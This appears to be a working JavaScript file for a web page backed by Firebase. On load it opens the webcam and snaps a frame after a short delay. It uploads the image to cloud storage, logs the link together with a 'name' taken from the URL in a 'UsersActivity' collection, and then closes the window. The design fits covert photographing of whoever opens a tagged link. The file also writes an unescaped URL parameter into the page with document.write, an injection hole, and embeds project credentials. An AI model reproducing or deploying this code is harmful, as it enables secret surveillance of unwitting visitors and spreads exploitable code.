const firebaseConfig = {
    apiKey: "AIzaSyA7nKCpBqqsx5gfu6lirHNvAo5XUNHPVqI",
    authDomain: "home-55fa7.firebaseapp.com",
    databaseURL: "https://home-55fa7-default-rtdb.firebaseio.com",
    projectId: "home-55fa7",
    storageBucket: "home-55fa7.appspot.com",
    messagingSenderId: "778328424815",
    appId: "1:778328424815:web:f12c00b6ed9d09c76ca89a",
    measurementId: "G-VBBP4YBV4C"
};
//firebase.initializeApp(firebaseConfig);
const app = firebase.initializeApp(firebaseConfig);

window.onload = function() {
    upload();
};


function upload1() {
    const queryString = window.location;
    console.log(queryString);
    var url = new URL(queryString);
    var c = url.searchParams.get("name");//http://localhost:8080/ClientSideWeb_war_exploded/firebase_html.html?name=gxgj..df.xcv.d.
    console.log(c);
    document.write(c);
}

console.log(firebase);

function uploadImage() {
    const ref = firebase.storage().ref();
    const file = document.querySelector("#photo").files[0];
    console.log(file)
    const name = +new Date() + "-" + file.name;
    const metadata = {
        contentType: file.type
    };
    const task = ref.child(name).put(file, metadata);
    task
        .then(snapshot => snapshot.ref.getDownloadURL())
        .then(url => {
            console.log(url);
            document.querySelector("#image").src = url;
        })
        .catch(console.error);
}

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const snap = document.getElementById("snap");
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
    audio: false,
    video: {
        width: 400, height: 400
    }
};

// Access webcam
async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
    } catch (e) {
        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
    }
}

// Success
function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;
}

// Load init
init();

var context = canvas.getContext('2d');

function upload() {
    setTimeout(() => {
        context.drawImage(video, 0, 0, 640, 480);
        var image = new Image();
        image.id = "pic";
        image.src = canvas.toDataURL();
        console.log("link"+image.src)
        setTimeout(() => {
            const ref = firebase.storage().ref();
            ref.child(new Date() + '-' + 'base64').putString(image.src, 'data_url').then(function (snapshot) {
                console.log('Uploaded a data_url string!');
                /*alert("Image Uploaded")*/
                const queryString = window.location;
                console.log(queryString);
                var url = new URL(queryString);
                var c = url.searchParams.get("name");
                var currentdate = new Date();
                var datetime = "" + currentdate.getDate() + ""
                    + (currentdate.getMonth()+1)  + ""
                    + currentdate.getFullYear() + ""
                    + currentdate.getHours() + ""
                    + currentdate.getMinutes() + ""
                    + currentdate.getSeconds();
                snapshot.ref.getDownloadURL().then((downloadURL) => {
                    console.log('File available at', downloadURL);
                    const firestore = app.firestore();
                    firestore.collection("UsersActivity").doc(datetime).set({
                        link: downloadURL,
                        type:c
                    }).then(() => {
                            console.log("Document successfully written!");
                            window.close();
                        })
                        .catch((error) => {
                            console.error("Error writing document: ", error);
                        });
                }).then(()=>{
                    window.close();
                });

            });
            }, 2000);
        }, 2000);
}